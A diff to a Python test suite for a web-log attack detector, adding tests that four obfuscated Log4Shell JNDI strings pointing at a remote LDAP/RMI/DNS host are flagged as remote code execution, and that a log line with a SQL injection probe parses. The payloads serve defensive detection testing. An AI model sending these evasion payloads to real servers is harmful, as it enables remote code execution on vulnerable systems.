@@ -139,3 +139,25 @@ def test_sample_log_end_to_end():
     assert by_ip[("203.0.113.88", "path_traversal")].count == 4  # incluida la de doble codificación
     assert ("203.0.113.70", "sqli") in by_ip  # la que va con '+'
     assert ("203.0.113.140", "rce") in by_ip  # Log4Shell en el User-Agent
+
+
+@pytest.mark.parametrize(
+    "ua",
+    [
+        "${${lower:j}ndi:ldap://203.0.113.9/a}",
+        "${${::-j}${::-n}${::-d}${::-i}:rmi://203.0.113.9/a}",
+        "${${env:NADA:-j}ndi${env:NADA:-:}ldap://203.0.113.9/a}",
+        "${${upper:j}${upper:n}di:dns://203.0.113.9/a}",
+    ],
+)
+def test_detects_obfuscated_log4shell(ua):
+    # Las variantes ofuscadas de Log4Shell esquivan la búsqueda literal de "${jndi:".
+    assert "rce" in rules_for(line("192.0.2.66", "GET / HTTP/1.1", ua=ua))
+
+
+def test_vhost_combined_format_is_parsed():
+    # Apache en Debian/Ubuntu escribe other_vhosts_access.log con el host delante.
+    events = parse(
+        'web.example:443 198.51.100.5 - - [25/Sep/2026:10:00:00 +0200] "GET /?id=1+union+select HTTP/1.1" 200 5 "-" "x"'
+    )
+    assert len(events) == 1 and events[0].ip == "198.51.100.5"
